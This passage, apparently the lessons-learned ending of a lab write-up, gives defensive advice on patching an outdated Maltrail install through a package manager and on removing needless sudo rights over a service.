- **Use a package manager**. Even internal software should be updated consistently. In my opinion, the big oversight on this box was running an outdated version of Maltrail. This software was "installed" simply by a scheduled process to clone a repo into `/opt`: the simpler (and more secure) way to do this is to use a package manager like `apt`. Better yet, use a `snap` and keep the process confined. 
- **Least-privilege** is a rule to live by. There was no reason that `puma` needed to have sudo access to `trail.service`, especially if it was just to check the status. As pointed out in several places in `maltrail.conf`, log-checking could have relied on setting *capabilities* for the service, instead of excessive user *privileges*.  

